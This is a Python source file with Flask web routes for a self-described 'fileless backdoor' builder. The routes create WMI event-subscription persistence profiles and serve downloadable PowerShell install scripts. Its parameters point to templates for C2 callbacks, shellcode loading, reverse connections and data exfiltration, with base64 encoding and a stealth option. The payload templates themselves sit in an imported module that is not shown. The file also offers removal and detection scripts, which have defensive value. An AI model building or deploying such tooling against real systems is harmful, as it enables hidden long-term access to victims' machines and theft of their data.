"""
Flask routes for WMI Persistence Engine
Fileless Backdoor via WMI Event Subscriptions
"""

from flask import Blueprint, render_template, request, jsonify, send_file
import sys
import os
import io

# Add tools directory to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'tools'))

from wmi_persistence import (
    get_engine, TriggerType, ConsumerType, PayloadEncoding
)

wmi_persistence_bp = Blueprint('wmi_persistence', __name__, url_prefix='/wmi-persistence')


@wmi_persistence_bp.route('/')
def index():
    """WMI Persistence Engine main page"""
    engine = get_engine()
    stats = engine.get_stats()
    profiles = engine.get_profiles()
    filters = engine.get_filters()
    consumers = engine.get_consumers()
    
    return render_template('wmi_persistence.html',
                           stats=stats,
                           profiles=profiles[:20],
                           filters=filters[:10],
                           consumers=consumers[:10],
                           trigger_types=[t.value for t in TriggerType],
                           consumer_types=[c.value for c in ConsumerType],
                           payload_templates=list(engine.PAYLOAD_TEMPLATES.keys()),
                           encodings=[e.value for e in PayloadEncoding])


@wmi_persistence_bp.route('/api/create-profile', methods=['POST'])
def create_profile():
    """Create a complete WMI persistence profile"""
    try:
        data = request.get_json()
        name = data.get('name', 'WMI_Persistence')
        trigger_type = data.get('trigger_type', 'startup')
        consumer_type = data.get('consumer_type', 'powershell')
        payload = data.get('payload')
        payload_template = data.get('payload_template')
        encoding = data.get('encoding', 'base64')
        stealth = data.get('stealth', True)
        
        # Additional params for templates
        params = {}
        for key in ['host', 'port', 'c2_url', 'interval', 'url', 'shellcode_b64', 
                    'path', 'patterns', 'exfil_url', 'process_name', 'service_name',
                    'hour', 'minute', 'path_pattern']:
            if key in data:
                params[key] = data[key]
        
        engine = get_engine()
        profile = engine.create_persistence_profile(
            name=name,
            trigger_type=TriggerType(trigger_type),
            consumer_type=ConsumerType(consumer_type),
            payload=payload,
            payload_template=payload_template,
            encoding=PayloadEncoding(encoding),
            stealth=stealth,
            **params
        )
        
        return jsonify({
            'success': True,
            'profile_id': profile.profile_id,
            'filter_name': profile.filter.name,
            'consumer_name': profile.consumer.name,
            'trigger': profile.filter.trigger_type.value,
            'install_script_preview': profile.install_script[:500] + '...'
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@wmi_persistence_bp.route('/api/create-filter', methods=['POST'])
def create_filter():
    """Create a standalone event filter"""
    try:
        data = request.get_json()
        trigger_type = data.get('trigger_type', 'startup')
        name = data.get('name')
        custom_query = data.get('custom_query')
        
        # Query parameters
        params = {}
        for key in ['process_name', 'service_name', 'hour', 'minute', 'path_pattern']:
            if key in data:
                params[key] = data[key]
        
        engine = get_engine()
        event_filter = engine.create_event_filter(
            trigger_type=TriggerType(trigger_type),
            name=name,
            custom_query=custom_query,
            **params
        )
        
        return jsonify({
            'success': True,
            'filter_id': event_filter.filter_id,
            'name': event_filter.name,
            'query': event_filter.query,
            'trigger_type': event_filter.trigger_type.value
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@wmi_persistence_bp.route('/api/create-consumer', methods=['POST'])
def create_consumer():
    """Create a standalone event consumer"""
    try:
        data = request.get_json()
        consumer_type = data.get('consumer_type', 'powershell')
        payload = data.get('payload')
        payload_template = data.get('payload_template')
        name = data.get('name')
        encoding = data.get('encoding', 'base64')
        
        # Template parameters
        params = {}
        for key in ['host', 'port', 'c2_url', 'interval', 'url', 'shellcode_b64',
                    'path', 'patterns', 'exfil_url']:
            if key in data:
                params[key] = data[key]
        
        engine = get_engine()
        consumer = engine.create_event_consumer(
            consumer_type=ConsumerType(consumer_type),
            payload=payload,
            payload_template=payload_template,
            name=name,
            encoding=PayloadEncoding(encoding),
            **params
        )
        
        return jsonify({
            'success': True,
            'consumer_id': consumer.consumer_id,
            'name': consumer.name,
            'consumer_type': consumer.consumer_type.value,
            'encoded_payload_preview': consumer.encoded_payload[:100] + '...' if len(consumer.encoded_payload) > 100 else consumer.encoded_payload
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@wmi_persistence_bp.route('/api/get-profile/<profile_id>')
def get_profile(profile_id):
    """Get profile details including scripts"""
    try:
        engine = get_engine()
        profile = engine.get_profile(profile_id)
        
        if not profile:
            return jsonify({'success': False, 'error': 'Profile not found'}), 404
        
        return jsonify({
            'success': True,
            'profile': profile
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@wmi_persistence_bp.route('/api/download-install/<profile_id>')
def download_install_script(profile_id):
    """Download installation script for a profile"""
    try:
        engine = get_engine()
        profile = engine.get_profile(profile_id)
        
        if not profile:
            return jsonify({'success': False, 'error': 'Profile not found'}), 404
        
        script = profile.get('install_script', '')
        
        return send_file(
            io.BytesIO(script.encode()),
            mimetype='text/plain',
            as_attachment=True,
            download_name=f"install_{profile['name']}.ps1"
        )
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@wmi_persistence_bp.route('/api/download-remove/<profile_id>')
def download_remove_script(profile_id):
    """Download removal script for a profile"""
    try:
        engine = get_engine()
        profile = engine.get_profile(profile_id)
        
        if not profile:
            return jsonify({'success': False, 'error': 'Profile not found'}), 404
        
        script = profile.get('remove_script', '')
        
        return send_file(
            io.BytesIO(script.encode()),
            mimetype='text/plain',
            as_attachment=True,
            download_name=f"remove_{profile['name']}.ps1"
        )
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@wmi_persistence_bp.route('/api/detection-script')
def get_detection_script():
    """Get WMI persistence detection script"""
    try:
        engine = get_engine()
        script = engine.generate_detection_script()
        
        return jsonify({
            'success': True,
            'script': script
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@wmi_persistence_bp.route('/api/download-detection')
def download_detection_script():
    """Download detection script"""
    try:
        engine = get_engine()
        script = engine.generate_detection_script()
        
        return send_file(
            io.BytesIO(script.encode()),
            mimetype='text/plain',
            as_attachment=True,
            download_name="detect_wmi_persistence.ps1"
        )
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@wmi_persistence_bp.route('/api/profiles')
def list_profiles():
    """List all persistence profiles"""
    engine = get_engine()
    profiles = engine.get_profiles()
    return jsonify({'success': True, 'profiles': profiles})


@wmi_persistence_bp.route('/api/filters')
def list_filters():
    """List all event filters"""
    engine = get_engine()
    filters = engine.get_filters()
    return jsonify({'success': True, 'filters': filters})


@wmi_persistence_bp.route('/api/consumers')
def list_consumers():
    """List all event consumers"""
    engine = get_engine()
    consumers = engine.get_consumers()
    return jsonify({'success': True, 'consumers': consumers})


@wmi_persistence_bp.route('/api/trigger-types')
def list_trigger_types():
    """List available trigger types"""
    return jsonify({
        'success': True,
        'trigger_types': [
            {'value': t.value, 'name': t.name}
            for t in TriggerType
        ]
    })


@wmi_persistence_bp.route('/api/payload-templates')
def list_payload_templates():
    """List available payload templates"""
    engine = get_engine()
    return jsonify({
        'success': True,
        'templates': list(engine.PAYLOAD_TEMPLATES.keys())
    })


@wmi_persistence_bp.route('/api/stats')
def get_stats():
    """Get engine statistics"""
    engine = get_engine()
    return jsonify({'success': True, 'stats': engine.get_stats()})
